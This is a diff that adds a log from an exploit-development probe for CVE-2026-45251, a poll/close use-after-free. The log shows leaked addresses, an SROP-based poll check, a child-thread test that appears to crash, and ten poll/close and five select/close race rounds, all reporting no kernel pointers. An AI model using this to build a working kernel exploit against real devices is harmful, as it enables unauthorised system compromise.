@@ -1,0 +1,40 @@
+=== PROBE 153b: CVE-2026-45251 POLL/CLOSE UAF v2 ===
+
+pid=864
+eboot=0x046414000
+sc_addr=0x807844B5A
+gpu=0x31145C000
+
+--- [A] SROP POLL VERIFICATION ---
+test_pipe: rd=22 wr=23
+poll(empty,0ms)=0
+poll(data,0ms)=1 revents=1
+poll_via_srop=WORKS
+
+--- [B] CHILD THREAD SYSCALL TEST ---
+child_tid=101280 create=true
+child_getpid=0xDEADDEADDEADDEAD
+child did not write result (may have crashed)
+
+--- [C] POLL/CLOSE RACE ---
+round=1 tid=101304 poll_result=0x100000016 fd_reused=true kptrs=0 alive=true
+round=2 tid=101320 poll_result=0x100000016 fd_reused=true kptrs=0 alive=true
+round=3 tid=101324 poll_result=0x100000016 fd_reused=true kptrs=0 alive=true
+round=4 tid=101335 poll_result=0x100000016 fd_reused=true kptrs=0 alive=true
+round=5 tid=101371 poll_result=0x100000016 fd_reused=true kptrs=0 alive=true
+round=6 tid=101373 poll_result=0x100000016 fd_reused=true kptrs=0 alive=true
+round=7 tid=101388 poll_result=0x100000016 fd_reused=true kptrs=0 alive=true
+round=8 tid=101405 poll_result=0x100000016 fd_reused=true kptrs=0 alive=true
+round=9 tid=101402 poll_result=0x100000016 fd_reused=true kptrs=0 alive=true
+round=10 tid=101454 poll_result=0x100000016 fd_reused=true kptrs=0 alive=true
+total_rounds=10 alive_post=10
+
+--- [D] SELECT/CLOSE RACE ---
+select_round=1 tid=101650 alive=true
+select_round=2 tid=101704 alive=true
+select_round=3 tid=101739 alive=true
+select_round=4 tid=101929 alive=true
+select_round=5 tid=101396 alive=true
+
+pid_final=864
+=== DONE ===
